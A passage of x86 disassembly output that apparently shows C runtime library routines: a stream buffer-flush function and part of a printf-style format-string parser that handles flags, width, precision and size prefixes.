  40c3c8:	89 50 0c             	mov    %edx,0xc(%eax)
  40c3cb:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c3ce:	8b 51 0c             	mov    0xc(%ecx),%edx
  40c3d1:	83 e2 ef             	and    $0xffffffef,%edx
  40c3d4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c3d7:	89 50 0c             	mov    %edx,0xc(%eax)
  40c3da:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c3dd:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40c3e4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40c3eb:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c3ee:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40c3f1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c3f4:	8b 48 0c             	mov    0xc(%eax),%ecx
  40c3f7:	81 e1 0c 01 00 00    	and    $0x10c,%ecx
  40c3fd:	85 c9                	test   %ecx,%ecx
  40c3ff:	75 2e                	jne    0x40c42f
  40c401:	81 7d f8 c0 d7 45 00 	cmpl   $0x45d7c0,-0x8(%ebp)
  40c408:	74 09                	je     0x40c413
  40c40a:	81 7d f8 e0 d7 45 00 	cmpl   $0x45d7e0,-0x8(%ebp)
  40c411:	75 10                	jne    0x40c423
  40c413:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40c416:	52                   	push   %edx
  40c417:	e8 a4 16 00 00       	call   0x40dac0
  40c41c:	83 c4 04             	add    $0x4,%esp
  40c41f:	85 c0                	test   %eax,%eax
  40c421:	75 0c                	jne    0x40c42f
  40c423:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c426:	50                   	push   %eax
  40c427:	e8 c4 15 00 00       	call   0x40d9f0
  40c42c:	83 c4 04             	add    $0x4,%esp
  40c42f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c432:	8b 51 0c             	mov    0xc(%ecx),%edx
  40c435:	81 e2 08 01 00 00    	and    $0x108,%edx
  40c43b:	85 d2                	test   %edx,%edx
  40c43d:	0f 84 d8 00 00 00    	je     0x40c51b
  40c443:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c446:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c449:	8b 10                	mov    (%eax),%edx
  40c44b:	2b 51 08             	sub    0x8(%ecx),%edx
  40c44e:	85 d2                	test   %edx,%edx
  40c450:	7d 21                	jge    0x40c473
  40c452:	68 74 fd 40 00       	push   $0x40fd74
  40c457:	6a 00                	push   $0x0
  40c459:	68 a0 00 00 00       	push   $0xa0
  40c45e:	68 b4 fd 40 00       	push   $0x40fdb4
  40c463:	6a 02                	push   $0x2
  40c465:	e8 56 d1 ff ff       	call   0x4095c0
  40c46a:	83 c4 14             	add    $0x14,%esp
  40c46d:	83 f8 01             	cmp    $0x1,%eax
  40c470:	75 01                	jne    0x40c473
  40c472:	cc                   	int3
  40c473:	33 c0                	xor    %eax,%eax
  40c475:	85 c0                	test   %eax,%eax
  40c477:	75 ca                	jne    0x40c443
  40c479:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c47c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c47f:	8b 01                	mov    (%ecx),%eax
  40c481:	2b 42 08             	sub    0x8(%edx),%eax
  40c484:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40c487:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c48a:	8b 51 08             	mov    0x8(%ecx),%edx
  40c48d:	83 c2 01             	add    $0x1,%edx
  40c490:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c493:	89 10                	mov    %edx,(%eax)
  40c495:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c498:	8b 51 18             	mov    0x18(%ecx),%edx
  40c49b:	83 ea 01             	sub    $0x1,%edx
  40c49e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c4a1:	89 50 04             	mov    %edx,0x4(%eax)
  40c4a4:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40c4a8:	7e 1c                	jle    0x40c4c6
  40c4aa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40c4ad:	51                   	push   %ecx
  40c4ae:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c4b1:	8b 42 08             	mov    0x8(%edx),%eax
  40c4b4:	50                   	push   %eax
  40c4b5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40c4b8:	51                   	push   %ecx
  40c4b9:	e8 22 12 00 00       	call   0x40d6e0
  40c4be:	83 c4 0c             	add    $0xc,%esp
  40c4c1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40c4c4:	eb 48                	jmp    0x40c50e
  40c4c6:	83 7d f0 ff          	cmpl   $0xffffffff,-0x10(%ebp)
  40c4ca:	74 1d                	je     0x40c4e9
  40c4cc:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40c4cf:	c1 fa 05             	sar    $0x5,%edx
  40c4d2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40c4d5:	83 e0 1f             	and    $0x1f,%eax
  40c4d8:	6b c0 24             	imul   $0x24,%eax,%eax
  40c4db:	8b 0c 95 60 f2 45 00 	mov    0x45f260(,%edx,4),%ecx
  40c4e2:	03 c8                	add    %eax,%ecx
  40c4e4:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40c4e7:	eb 07                	jmp    0x40c4f0
  40c4e9:	c7 45 ec d0 b0 45 00 	movl   $0x45b0d0,-0x14(%ebp)
  40c4f0:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40c4f3:	0f be 42 04          	movsbl 0x4(%edx),%eax
  40c4f7:	83 e0 20             	and    $0x20,%eax
  40c4fa:	85 c0                	test   %eax,%eax
  40c4fc:	74 10                	je     0x40c50e
  40c4fe:	6a 02                	push   $0x2
  40c500:	6a 00                	push   $0x0
  40c502:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40c505:	51                   	push   %ecx
  40c506:	e8 85 10 00 00       	call   0x40d590
  40c50b:	83 c4 0c             	add    $0xc,%esp
  40c50e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c511:	8b 42 08             	mov    0x8(%edx),%eax
  40c514:	8a 4d 08             	mov    0x8(%ebp),%cl
  40c517:	88 08                	mov    %cl,(%eax)
  40c519:	eb 1e                	jmp    0x40c539
  40c51b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40c522:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c525:	52                   	push   %edx
  40c526:	8d 45 08             	lea    0x8(%ebp),%eax
  40c529:	50                   	push   %eax
  40c52a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40c52d:	51                   	push   %ecx
  40c52e:	e8 ad 11 00 00       	call   0x40d6e0
  40c533:	83 c4 0c             	add    $0xc,%esp
  40c536:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40c539:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40c53c:	3b 55 fc             	cmp    -0x4(%ebp),%edx
  40c53f:	74 14                	je     0x40c555
  40c541:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c544:	8b 48 0c             	mov    0xc(%eax),%ecx
  40c547:	83 c9 20             	or     $0x20,%ecx
  40c54a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40c54d:	89 4a 0c             	mov    %ecx,0xc(%edx)
  40c550:	83 c8 ff             	or     $0xffffffff,%eax
  40c553:	eb 08                	jmp    0x40c55d
  40c555:	8b 45 08             	mov    0x8(%ebp),%eax
  40c558:	25 ff 00 00 00       	and    $0xff,%eax
  40c55d:	5f                   	pop    %edi
  40c55e:	5e                   	pop    %esi
  40c55f:	5b                   	pop    %ebx
  40c560:	8b e5                	mov    %ebp,%esp
  40c562:	5d                   	pop    %ebp
  40c563:	c3                   	ret
  40c564:	cc                   	int3
  40c565:	cc                   	int3
  40c566:	cc                   	int3
  40c567:	cc                   	int3
  40c568:	cc                   	int3
  40c569:	cc                   	int3
  40c56a:	cc                   	int3
  40c56b:	cc                   	int3
  40c56c:	cc                   	int3
  40c56d:	cc                   	int3
  40c56e:	cc                   	int3
  40c56f:	cc                   	int3
  40c570:	55                   	push   %ebp
  40c571:	8b ec                	mov    %esp,%ebp
  40c573:	81 ec ac 02 00 00    	sub    $0x2ac,%esp
  40c579:	53                   	push   %ebx
  40c57a:	56                   	push   %esi
  40c57b:	57                   	push   %edi
  40c57c:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  40c583:	c7 85 d0 fd ff ff 00 	movl   $0x0,-0x230(%ebp)
  40c58a:	00 00 00 
  40c58d:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40c594:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40c59b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40c59e:	8a 08                	mov    (%eax),%cl
  40c5a0:	88 4d d4             	mov    %cl,-0x2c(%ebp)
  40c5a3:	0f be 55 d4          	movsbl -0x2c(%ebp),%edx
  40c5a7:	8b 45 0c             	mov    0xc(%ebp),%eax
  40c5aa:	83 c0 01             	add    $0x1,%eax
  40c5ad:	89 45 0c             	mov    %eax,0xc(%ebp)
  40c5b0:	85 d2                	test   %edx,%edx
  40c5b2:	0f 84 66 0c 00 00    	je     0x40d21e
  40c5b8:	83 bd d0 fd ff ff 00 	cmpl   $0x0,-0x230(%ebp)
  40c5bf:	0f 8c 59 0c 00 00    	jl     0x40d21e
  40c5c5:	0f be 4d d4          	movsbl -0x2c(%ebp),%ecx
  40c5c9:	83 f9 20             	cmp    $0x20,%ecx
  40c5cc:	7c 1f                	jl     0x40c5ed
  40c5ce:	0f be 55 d4          	movsbl -0x2c(%ebp),%edx
  40c5d2:	83 fa 78             	cmp    $0x78,%edx
  40c5d5:	7f 16                	jg     0x40c5ed
  40c5d7:	0f be 45 d4          	movsbl -0x2c(%ebp),%eax
  40c5db:	0f be 88 ac fd 40 00 	movsbl 0x40fdac(%eax),%ecx
  40c5e2:	83 e1 0f             	and    $0xf,%ecx
  40c5e5:	89 8d 6c fd ff ff    	mov    %ecx,-0x294(%ebp)
  40c5eb:	eb 0a                	jmp    0x40c5f7
  40c5ed:	c7 85 6c fd ff ff 00 	movl   $0x0,-0x294(%ebp)
  40c5f4:	00 00 00 
  40c5f7:	8b 95 6c fd ff ff    	mov    -0x294(%ebp),%edx
  40c5fd:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40c600:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40c603:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40c606:	0f be 94 c1 cc fd 40 	movsbl 0x40fdcc(%ecx,%eax,8),%edx
  40c60d:	00 
  40c60e:	c1 fa 04             	sar    $0x4,%edx
  40c611:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40c614:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40c617:	89 85 68 fd ff ff    	mov    %eax,-0x298(%ebp)
  40c61d:	83 bd 68 fd ff ff 07 	cmpl   $0x7,-0x298(%ebp)
  40c624:	0f 87 ef 0b 00 00    	ja     0x40d219
  40c62a:	8b 8d 68 fd ff ff    	mov    -0x298(%ebp),%ecx
  40c630:	ff 24 8d 2b d2 40 00 	jmp    *0x40d22b(,%ecx,4)
  40c637:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40c63e:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40c641:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40c647:	a1 04 d3 45 00       	mov    0x45d304,%eax
  40c64c:	33 c9                	xor    %ecx,%ecx
  40c64e:	66 8b 0c 50          	mov    (%eax,%edx,2),%cx
  40c652:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  40c658:	85 c9                	test   %ecx,%ecx
  40c65a:	74 58                	je     0x40c6b4
  40c65c:	8d 95 d0 fd ff ff    	lea    -0x230(%ebp),%edx
  40c662:	52                   	push   %edx
  40c663:	8b 45 08             	mov    0x8(%ebp),%eax
  40c666:	50                   	push   %eax
  40c667:	0f be 4d d4          	movsbl -0x2c(%ebp),%ecx
  40c66b:	51                   	push   %ecx
  40c66c:	e8 bf 0c 00 00       	call   0x40d330
  40c671:	83 c4 0c             	add    $0xc,%esp
  40c674:	8b 55 0c             	mov    0xc(%ebp),%edx
  40c677:	8a 02                	mov    (%edx),%al
  40c679:	88 45 d4             	mov    %al,-0x2c(%ebp)
  40c67c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40c67f:	83 c1 01             	add    $0x1,%ecx
  40c682:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40c685:	0f be 55 d4          	movsbl -0x2c(%ebp),%edx
  40c689:	85 d2                	test   %edx,%edx
  40c68b:	75 21                	jne    0x40c6ae
  40c68d:	68 4c fe 40 00       	push   $0x40fe4c
  40c692:	6a 00                	push   $0x0
  40c694:	68 8e 01 00 00       	push   $0x18e
  40c699:	68 40 fe 40 00       	push   $0x40fe40
  40c69e:	6a 02                	push   $0x2
  40c6a0:	e8 1b cf ff ff       	call   0x4095c0
  40c6a5:	83 c4 14             	add    $0x14,%esp
  40c6a8:	83 f8 01             	cmp    $0x1,%eax
  40c6ab:	75 01                	jne    0x40c6ae
  40c6ad:	cc                   	int3
  40c6ae:	33 c0                	xor    %eax,%eax
  40c6b0:	85 c0                	test   %eax,%eax
  40c6b2:	75 d1                	jne    0x40c685
  40c6b4:	8d 8d d0 fd ff ff    	lea    -0x230(%ebp),%ecx
  40c6ba:	51                   	push   %ecx
  40c6bb:	8b 55 08             	mov    0x8(%ebp),%edx
  40c6be:	52                   	push   %edx
  40c6bf:	0f be 45 d4          	movsbl -0x2c(%ebp),%eax
  40c6c3:	50                   	push   %eax
  40c6c4:	e8 67 0c 00 00       	call   0x40d330
  40c6c9:	83 c4 0c             	add    $0xc,%esp
  40c6cc:	e9 48 0b 00 00       	jmp    0x40d219
  40c6d1:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40c6d8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c6db:	89 8d c0 fd ff ff    	mov    %ecx,-0x240(%ebp)
  40c6e1:	8b 95 c0 fd ff ff    	mov    -0x240(%ebp),%edx
  40c6e7:	89 95 b8 fd ff ff    	mov    %edx,-0x248(%ebp)
  40c6ed:	8b 85 b8 fd ff ff    	mov    -0x248(%ebp),%eax
  40c6f3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40c6f6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40c6fd:	c7 85 c8 fd ff ff ff 	movl   $0xffffffff,-0x238(%ebp)
  40c704:	ff ff ff 
  40c707:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40c70e:	e9 06 0b 00 00       	jmp    0x40d219
  40c713:	0f be 4d d4          	movsbl -0x2c(%ebp),%ecx
  40c717:	89 8d 64 fd ff ff    	mov    %ecx,-0x29c(%ebp)
  40c71d:	8b 95 64 fd ff ff    	mov    -0x29c(%ebp),%edx
  40c723:	83 ea 20             	sub    $0x20,%edx
  40c726:	89 95 64 fd ff ff    	mov    %edx,-0x29c(%ebp)
  40c72c:	83 bd 64 fd ff ff 10 	cmpl   $0x10,-0x29c(%ebp)
  40c733:	77 48                	ja     0x40c77d
  40c735:	8b 8d 64 fd ff ff    	mov    -0x29c(%ebp),%ecx
  40c73b:	33 c0                	xor    %eax,%eax
  40c73d:	8a 81 63 d2 40 00    	mov    0x40d263(%ecx),%al
  40c743:	ff 24 85 4b d2 40 00 	jmp    *0x40d24b(,%eax,4)
  40c74a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c74d:	83 ca 04             	or     $0x4,%edx
  40c750:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40c753:	eb 28                	jmp    0x40c77d
  40c755:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c758:	0c 01                	or     $0x1,%al
  40c75a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40c75d:	eb 1e                	jmp    0x40c77d
  40c75f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40c762:	83 c9 02             	or     $0x2,%ecx
  40c765:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40c768:	eb 13                	jmp    0x40c77d
  40c76a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c76d:	80 ca 80             	or     $0x80,%dl
  40c770:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40c773:	eb 08                	jmp    0x40c77d
  40c775:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c778:	0c 08                	or     $0x8,%al
  40c77a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40c77d:	e9 97 0a 00 00       	jmp    0x40d219
  40c782:	0f be 4d d4          	movsbl -0x2c(%ebp),%ecx
  40c786:	83 f9 2a             	cmp    $0x2a,%ecx
  40c789:	75 33                	jne    0x40c7be
  40c78b:	8d 55 10             	lea    0x10(%ebp),%edx
  40c78e:	52                   	push   %edx
  40c78f:	e8 ac 0c 00 00       	call   0x40d440
  40c794:	83 c4 04             	add    $0x4,%esp
  40c797:	89 85 b8 fd ff ff    	mov    %eax,-0x248(%ebp)
  40c79d:	83 bd b8 fd ff ff 00 	cmpl   $0x0,-0x248(%ebp)
  40c7a4:	7d 16                	jge    0x40c7bc
  40c7a6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c7a9:	0c 04                	or     $0x4,%al
  40c7ab:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40c7ae:	8b 8d b8 fd ff ff    	mov    -0x248(%ebp),%ecx
  40c7b4:	f7 d9                	neg    %ecx
  40c7b6:	89 8d b8 fd ff ff    	mov    %ecx,-0x248(%ebp)
  40c7bc:	eb 17                	jmp    0x40c7d5
  40c7be:	8b 95 b8 fd ff ff    	mov    -0x248(%ebp),%edx
  40c7c4:	6b d2 0a             	imul   $0xa,%edx,%edx
  40c7c7:	0f be 45 d4          	movsbl -0x2c(%ebp),%eax
  40c7cb:	8d 4c 02 d0          	lea    -0x30(%edx,%eax,1),%ecx
  40c7cf:	89 8d b8 fd ff ff    	mov    %ecx,-0x248(%ebp)
  40c7d5:	e9 3f 0a 00 00       	jmp    0x40d219
  40c7da:	c7 85 c8 fd ff ff 00 	movl   $0x0,-0x238(%ebp)
  40c7e1:	00 00 00 
  40c7e4:	e9 30 0a 00 00       	jmp    0x40d219
  40c7e9:	0f be 55 d4          	movsbl -0x2c(%ebp),%edx
  40c7ed:	83 fa 2a             	cmp    $0x2a,%edx
  40c7f0:	75 27                	jne    0x40c819
  40c7f2:	8d 45 10             	lea    0x10(%ebp),%eax
  40c7f5:	50                   	push   %eax
  40c7f6:	e8 45 0c 00 00       	call   0x40d440
  40c7fb:	83 c4 04             	add    $0x4,%esp
  40c7fe:	89 85 c8 fd ff ff    	mov    %eax,-0x238(%ebp)
  40c804:	83 bd c8 fd ff ff 00 	cmpl   $0x0,-0x238(%ebp)
  40c80b:	7d 0a                	jge    0x40c817
  40c80d:	c7 85 c8 fd ff ff ff 	movl   $0xffffffff,-0x238(%ebp)
  40c814:	ff ff ff 
  40c817:	eb 17                	jmp    0x40c830
  40c819:	8b 8d c8 fd ff ff    	mov    -0x238(%ebp),%ecx
  40c81f:	6b c9 0a             	imul   $0xa,%ecx,%ecx
  40c822:	0f be 55 d4          	movsbl -0x2c(%ebp),%edx
  40c826:	8d 44 11 d0          	lea    -0x30(%ecx,%edx,1),%eax
  40c82a:	89 85 c8 fd ff ff    	mov    %eax,-0x238(%ebp)
  40c830:	e9 e4 09 00 00       	jmp    0x40d219
  40c835:	0f be 4d d4          	movsbl -0x2c(%ebp),%ecx
  40c839:	89 8d 60 fd ff ff    	mov    %ecx,-0x2a0(%ebp)
  40c83f:	8b 95 60 fd ff ff    	mov    -0x2a0(%ebp),%edx
  40c845:	83 ea 49             	sub    $0x49,%edx
  40c848:	89 95 60 fd ff ff    	mov    %edx,-0x2a0(%ebp)
  40c84e:	83 bd 60 fd ff ff 2e 	cmpl   $0x2e,-0x2a0(%ebp)
  40c855:	77 6c                	ja     0x40c8c3
  40c857:	8b 8d 60 fd ff ff    	mov    -0x2a0(%ebp),%ecx
  40c85d:	33 c0                	xor    %eax,%eax
  40c85f:	8a 81 88 d2 40 00    	mov    0x40d288(%ecx),%al
  40c865:	ff 24 85 74 d2 40 00 	jmp    *0x40d274(,%eax,4)
  40c86c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c86f:	83 ca 10             	or     $0x10,%edx
  40c872:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40c875:	eb 4c                	jmp    0x40c8c3
  40c877:	8b 45 0c             	mov    0xc(%ebp),%eax
  40c87a:	0f be 08             	movsbl (%eax),%ecx
  40c87d:	83 f9 36             	cmp    $0x36,%ecx
  40c880:	75 20                	jne    0x40c8a2
  40c882:	8b 55 0c             	mov    0xc(%ebp),%edx
  40c885:	0f be 42 01          	movsbl 0x1(%edx),%eax
  40c889:	83 f8 34             	cmp    $0x34,%eax
  40c88c:	75 14                	jne    0x40c8a2
  40c88e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40c891:	83 c1 02             	add    $0x2,%ecx
  40c894:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40c897:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c89a:	80 ce 80             	or     $0x80,%dh
  40c89d:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40c8a0:	eb 0c                	jmp    0x40c8ae
  40c8a2:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40c8a9:	e9 89 fd ff ff       	jmp    0x40c637
  40c8ae:	eb 13                	jmp    0x40c8c3
  40c8b0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c8b3:	0c 20                	or     $0x20,%al
  40c8b5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40c8b8:	eb 09                	jmp    0x40c8c3
  40c8ba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40c8bd:	80 cd 08             	or     $0x8,%ch
  40c8c0:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40c8c3:	e9 51 09 00 00       	jmp    0x40d219
  40c8c8:	0f be 55 d4          	movsbl -0x2c(%ebp),%edx
  40c8cc:	89 95 5c fd ff ff    	mov    %edx,-0x2a4(%ebp)
  40c8d2:	8b 85 5c fd ff ff    	mov    -0x2a4(%ebp),%eax
  40c8d8:	83 e8 43             	sub    $0x43,%eax
  40c8db:	89 85 5c fd ff ff    	mov    %eax,-0x2a4(%ebp)
  40c8e1:	83 bd 5c fd ff ff 35 	cmpl   $0x35,-0x2a4(%ebp)
  40c8e8:	0f 87 35 07 00 00    	ja     0x40d023
  40c8ee:	8b 95 5c fd ff ff    	mov    -0x2a4(%ebp),%edx
  40c8f4:	33 c9                	xor    %ecx,%ecx
  40c8f6:	8a 8a f3 d2 40 00    	mov    0x40d2f3(%edx),%cl
  40c8fc:	ff 24 8d b7 d2 40 00 	jmp    *0x40d2b7(,%ecx,4)
  40c903:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c906:	25 30 08 00 00       	and    $0x830,%eax
  40c90b:	85 c0                	test   %eax,%eax
  40c90d:	75 09                	jne    0x40c918
  40c90f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40c912:	80 cd 08             	or     $0x8,%ch
  40c915:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40c918:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c91b:	81 e2 10 08 00 00    	and    $0x810,%edx
  40c921:	85 d2                	test   %edx,%edx
  40c923:	74 39                	je     0x40c95e
  40c925:	8d 45 10             	lea    0x10(%ebp),%eax
  40c928:	50                   	push   %eax
  40c929:	e8 52 0b 00 00       	call   0x40d480
  40c92e:	83 c4 04             	add    $0x4,%esp
  40c931:	66 89 45 e8          	mov    %ax,-0x18(%ebp)
  40c935:	66 8b 4d e8          	mov    -0x18(%ebp),%cx
  40c939:	51                   	push   %ecx
  40c93a:	8d 95 d4 fd ff ff    	lea    -0x22c(%ebp),%edx
  40c940:	52                   	push   %edx
  40c941:	e8 ea 13 00 00       	call   0x40dd30
  40c946:	83 c4 08             	add    $0x8,%esp
  40c949:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40c94c:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  40c950:	7d 0a                	jge    0x40c95c
  40c952:	c7 85 c0 fd ff ff 01 	movl   $0x1,-0x240(%ebp)
  40c959:	00 00 00 
  40c95c:	eb 26                	jmp    0x40c984
  40c95e:	8d 45 10             	lea    0x10(%ebp),%eax
  40c961:	50                   	push   %eax
  40c962:	e8 d9 0a 00 00       	call   0x40d440
  40c967:	83 c4 04             	add    $0x4,%esp
  40c96a:	66 89 85 b4 fd ff ff 	mov    %ax,-0x24c(%ebp)
  40c971:	8a 8d b4 fd ff ff    	mov    -0x24c(%ebp),%cl
  40c977:	88 8d d4 fd ff ff    	mov    %cl,-0x22c(%ebp)
  40c97d:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  40c984:	8d 95 d4 fd ff ff    	lea    -0x22c(%ebp),%edx
  40c98a:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40c98d:	e9 91 06 00 00       	jmp    0x40d023
  40c992:	8d 45 10             	lea    0x10(%ebp),%eax
  40c995:	50                   	push   %eax
  40c996:	e8 a5 0a 00 00       	call   0x40d440
  40c99b:	83 c4 04             	add    $0x4,%esp
  40c99e:	89 85 b0 fd ff ff    	mov    %eax,-0x250(%ebp)
  40c9a4:	83 bd b0 fd ff ff 00 	cmpl   $0x0,-0x250(%ebp)
  40c9ab:	74 0c                	je     0x40c9b9
  40c9ad:	8b 8d b0 fd ff ff    	mov    -0x250(%ebp),%ecx
  40c9b3:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  40c9b7:	75 1a                	jne    0x40c9d3
  40c9b9:	8b 15 88 d6 45 00    	mov    0x45d688,%edx
  40c9bf:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40c9c2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40c9c5:	50                   	push   %eax
  40c9c6:	e8 f5 df ff ff       	call   0x40a9c0
  40c9cb:	83 c4 04             	add    $0x4,%esp
  40c9ce:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40c9d1:	eb 4f                	jmp    0x40ca22
  40c9d3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40c9d6:	81 e1 00 08 00 00    	and    $0x800,%ecx
  40c9dc:	85 c9                	test   %ecx,%ecx
  40c9de:	74 23                	je     0x40ca03
  40c9e0:	8b 95 b0 fd ff ff    	mov    -0x250(%ebp),%edx
  40c9e6:	8b 42 04             	mov    0x4(%edx),%eax
  40c9e9:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40c9ec:	8b 8d b0 fd ff ff    	mov    -0x250(%ebp),%ecx
  40c9f2:	0f bf 11             	movswl (%ecx),%edx
  40c9f5:	d1 ea                	shr    $1,%edx
  40c9f7:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40c9fa:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  40ca01:	eb 1f                	jmp    0x40ca22
  40ca03:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40ca0a:	8b 85 b0 fd ff ff    	mov    -0x250(%ebp),%eax
  40ca10:	8b 48 04             	mov    0x4(%eax),%ecx
  40ca13:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40ca16:	8b 95 b0 fd ff ff    	mov    -0x250(%ebp),%edx
  40ca1c:	0f bf 02             	movswl (%edx),%eax
  40ca1f:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40ca22:	e9 fc 05 00 00       	jmp    0x40d023
  40ca27:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40ca2a:	81 e1 30 08 00 00    	and    $0x830,%ecx
  40ca30:	85 c9                	test   %ecx,%ecx
  40ca32:	75 09                	jne    0x40ca3d
  40ca34:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40ca37:	80 ce 08             	or     $0x8,%dh
  40ca3a:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40ca3d:	83 bd c8 fd ff ff ff 	cmpl   $0xffffffff,-0x238(%ebp)
  40ca44:	75 0c                	jne    0x40ca52
  40ca46:	c7 85 58 fd ff ff ff 	movl   $0x7fffffff,-0x2a8(%ebp)
  40ca4d:	ff ff 7f 
  40ca50:	eb 0c                	jmp    0x40ca5e
  40ca52:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  40ca58:	89 85 58 fd ff ff    	mov    %eax,-0x2a8(%ebp)
  40ca5e:	8b 8d 58 fd ff ff    	mov    -0x2a8(%ebp),%ecx
  40ca64:	89 8d a4 fd ff ff    	mov    %ecx,-0x25c(%ebp)
  40ca6a:	8d 55 10             	lea    0x10(%ebp),%edx
  40ca6d:	52                   	push   %edx
  40ca6e:	e8 cd 09 00 00       	call   0x40d440
  40ca73:	83 c4 04             	add    $0x4,%esp
  40ca76:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40ca79:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40ca7c:	25 10 08 00 00       	and    $0x810,%eax
  40ca81:	85 c0                	test   %eax,%eax
  40ca83:	74 68                	je     0x40caed
  40ca85:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  40ca89:	75 09                	jne    0x40ca94
  40ca8b:	8b 0d 8c d6 45 00    	mov    0x45d68c,%ecx
  40ca91:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40ca94:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
